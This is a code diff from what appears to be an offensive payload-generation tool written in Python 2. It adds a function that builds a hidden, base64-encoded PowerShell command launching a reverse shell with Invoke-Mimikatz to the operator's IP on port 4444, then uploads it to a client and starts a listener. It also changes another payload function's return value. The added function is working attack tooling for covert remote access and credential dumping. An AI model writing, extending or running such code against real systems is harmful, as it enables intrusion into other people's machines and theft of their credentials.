@@ -120,7 +120,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
     checkClientUpload(payloadname,powershellExec,isExe=False)
     startBindListener(int(portnum),useProxy=True)
-    return "clear"
+    return "noclear"
 
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
@@ -132,3 +132,13 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     startBindListener(int(portnum),useProxy=False)
     return "clear"
+
+def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
+    portnum,ipaddr = reverseIpAndPort('4444')
+
+    shellcode = payloadchoice % (ipaddr,portnum)
+    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
+    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
+    checkClientUpload(payloadname,powershellExec,isExe=False)
+    startBindListener(int(portnum),useProxy=False)
+    return "noclear"
